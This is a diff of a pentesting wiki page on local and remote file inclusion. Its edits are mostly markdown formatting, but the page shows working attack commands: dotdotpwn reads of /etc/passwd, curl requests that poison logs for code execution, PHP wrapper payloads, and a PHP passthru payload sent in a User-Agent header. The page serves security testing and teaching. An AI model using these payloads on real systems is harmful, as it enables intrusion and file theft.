@@ -2,21 +2,21 @@
 
 ## Theory
 
-Many web applications manage files and use server-side scripts to include them. When input parameters \(cookies, GET or POST parameters\) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to file inclusion.
+Many web applications manage files and use server-side scripts to include them. When input parameters (cookies, GET or POST parameters) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to file inclusion.
 
-LFI/RFI \(Local/Remote File Inclusion\) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE \(Remote Code Execution\) or to client-side attacks such as XSS \(Cross-Site Scripting\).
+LFI/RFI (Local/Remote File Inclusion) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE (Remote Code Execution) or to client-side attacks such as XSS (Cross-Site Scripting).
 
-[Directory traversal](directory-traversal.md) \(a.k.a. path traversal, directory climbing, backtracking, the dot dot slash attack\) attacks allow attackers to access sensitive files on the file system, outside the web server directory. File inclusion attacks can leverage a directory traversal vulnerability to include files with a relative path.
+[Directory traversal](directory-traversal.md) (a.k.a. path traversal, directory climbing, backtracking, the dot dot slash attack) attacks allow attackers to access sensitive files on the file system, outside the web server directory. File inclusion attacks can leverage a directory traversal vulnerability to include files with a relative path.
 
 ## Practice
 
-Testers need to identify input vectors \(parts of the app that accept content from the users\) that could be used for file-related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.
+Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for file-related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.
 
-* **Local File Inclusion**: inclusion of a local file \(in the webserver directory\) using an absolute path
-* **LFI + directory traversal**: inclusion of a local file \(in the webserver directory or not\) by "climbing" the server tree with `../` \(relative path\)
-* **Remote File Inclusion**: inclusion of a remote file \(not on the server\) using a URI
+* **Local File Inclusion**: inclusion of a local file (in the webserver directory) using an absolute path
+* **LFI + directory traversal**: inclusion of a local file (in the webserver directory or not) by "climbing" the server tree with `../` (relative path)
+* **Remote File Inclusion**: inclusion of a remote file (not on the server) using a URI
 
-The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) \(Perl\) can help in finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.
+The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) (Perl) can help in finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.
 
 ```bash
 # With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)
@@ -26,13 +26,13 @@ dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/p
 dotdotpwn -m stdout -d 5
 ```
 
-The tool [kadimus](https://github.com/P0cL4bs/Kadimus) \(C\) can help in finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.
+The tool [kadimus](https://github.com/P0cL4bs/Kadimus) (C) can help in finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.
 
 ```bash
 kadimus --user-agent "PENTEST" -u '$URL/?parameter=value'
 ```
 
-Depending on the environment, file inclusions can sometimes lead to RCE \(Remote Code Execution\) by including a local file containing code previously injected by the attacker or a remote file containing code that the server can execute.
+Depending on the environment, file inclusions can sometimes lead to RCE (Remote Code Execution) by including a local file containing code previously injected by the attacker or a remote file containing code that the server can execute.
 
 Local file inclusions can sometimes be combined with other vulnerabilities to achieve code execution
 
@@ -41,7 +41,7 @@ Local file inclusions can sometimes be combined with other vulnerabilities to ac
 * unrestricted file upload
 * log poisoning
 
-### LFI to RCE \(via logs poisoning\)
+### LFI to RCE (via logs poisoning)
 
 {% hint style="warning" %}
 Log files may be stored in different locations depending on the operating system/distribution.
@@ -61,7 +61,7 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
 
 #### /var/log/vsftpd.log
 
-When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload \(depending on which web technology is used\).
+When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).
 
 ```bash
 # Sending the payload via FTP
@@ -93,7 +93,7 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
 {% hint style="info" %}
 There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `access.log` path and file depending on the operating system/distribution:
 
-> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – **/var/log/httpd/access\_log**
+> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – **/var/log/httpd/access_log**
 > * Debian / Ubuntu Linux Apache access log file location – **/var/log/apache2/access.log**
 > * FreeBSD Apache access log file location – **/var/log/httpd-access.log**
 {% endhint %}
@@ -119,14 +119,14 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
 {% hint style="info" %}
 There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `error.log` path and file depending on the operating system/distribution:
 
-> * RHEL / Red Hat / CentOS / Fedora Linux Apache error file location – **/var/log/httpd/error\_log**
+> * RHEL / Red Hat / CentOS / Fedora Linux Apache error file location – **/var/log/httpd/error_log**
 > * Debian / Ubuntu Linux Apache error log file location – **/var/log/apache2/error.log**
 > * FreeBSD Apache error log file location – **/var/log/httpd-error.log**
 {% endhint %}
 
 #### **/var/log/mail.log**
 
-When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet \(as an example\).
+When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).
 
 ```bash
 # Sending the payload via telnet
@@ -138,11 +138,11 @@ telnet $TARGET_IP $TARGET_PORT
 curl --user-agent "PENTEST" $URL/?parameter=/var/log/mail.log&cmd=id
 ```
 
-### 🛠️ LFI to RCE \(via phpinfo\)
+### 🛠️ LFI to RCE (via phpinfo)
 
-### 🛠️ LFI to RCE \(via file upload\)
+### 🛠️ LFI to RCE (via file upload)
 
-### LFI to RCE \(via php wrappers\)
+### LFI to RCE (via php wrappers)
 
 #### Data wrapper
 
@@ -155,7 +155,7 @@ curl --user-agent "PENTEST" $URL/?parameter=data://text/plain;base64,$SHELL_BASE
 ```
 
 {% hint style="warning" %}
-The attribute `allow_url_include` should be set.   
+The attribute `allow_url_include` should be set. \
 This configuration can be checked in the `php.ini` file.
 {% endhint %}
 
@@ -167,14 +167,14 @@ curl -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
 ```
 
 {% hint style="warning" %}
-The attribute `allow_url_include` should be set.   
+The attribute `allow_url_include` should be set. \
 This configuration can be checked in the `php.ini` file.
 {% endhint %}
 
 #### Zip wrapper
 
 {% hint style="info" %}
-The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/~/drafts/-Mk6VflWDxyIbsU_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
 {% endhint %}
 
 ```bash
@@ -187,7 +187,7 @@ curl --user-agent "PENTEST" $URL/?parameter=zip://payload.zip%23payload.php&cmd=
 
 #### 🛠️ Phar wrapper
 
-### 🛠️ LFI to RCE \(via /proc\)
+### 🛠️ LFI to RCE (via /proc)
 
 #### /proc/self/environ
 
@@ -202,24 +202,23 @@ curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../pr
 
 #### 🛠️ /proc/\*/fd
 
-### 🛠️ LFI to RCE \(via PHP session\)
+### 🛠️ LFI to RCE (via PHP session)
 
-When a web server wants to handle sessions, it can use PHP session cookies \(PHPSESSID\).
+When a web server wants to handle sessions, it can use PHP session cookies (PHPSESSID).
 
 #### Reconnaissance
 
-1. Finding where the sessions are stored.
+1.  Finding where the sessions are stored.
 
-   Examples:
+    Examples:
 
-   * `/var/lib/php5/sess_[PHPSESSID]`
-   * `/var/lib/php/sessions/sess_[PHPSESSID]`
+    * `/var/lib/php5/sess_[PHPSESSID]`
+    * `/var/lib/php/sessions/sess_[PHPSESSID]`
+2.  Displaying a PHPSESSID to see if any parameter is reflected inside.
 
-2. Displaying a PHPSESSID to see if any parameter is reflected inside.
+    Example:
 
-   Example:
-
-   * The user name for the session \(from a parameter called `user`\)
+    * The user name for the session (from a parameter called `user`)
 
 #### RCE
 
@@ -262,19 +261,26 @@ As code execution functions can be filtered, the phpinfo testing phase is requir
 
 ## References
 
-{% embed url="https://www.acunetix.com/websitesecurity/directory-traversal" caption="" %}
+{% embed url="https://www.acunetix.com/websitesecurity/directory-traversal" %}
 
-{% embed url="https://portswigger.net/web-security/file-path-traversal" caption="" %}
+{% embed url="https://portswigger.net/web-security/file-path-traversal" %}
 
-{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/05-Authorization\_Testing/01-Testing\_Directory\_Traversal\_File\_Include.html" caption="Directory traversal and File Include" %}
+{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.html" %}
+Directory traversal and File Include
+{% endembed %}
 
-{% embed url="https://owasp.org/www-community/attacks/Path\_Traversal" caption="Testing for Directory traversal" %}
+{% embed url="https://owasp.org/www-community/attacks/Path_Traversal" %}
+Testing for Directory traversal
+{% endembed %}
 
-{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.2-Testing\_for\_Remote\_File\_Inclusion.html" caption="Testing for Remote File Inclusion" %}
+{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.html" %}
+Testing for Remote File Inclusion
+{% endembed %}
 
-{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion.html" caption="Testing for Local File Inclusion" %}
+{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.html" %}
+Testing for Local File Inclusion
+{% endembed %}
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" caption="" %}
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" %}
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" caption="" %}
-
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}
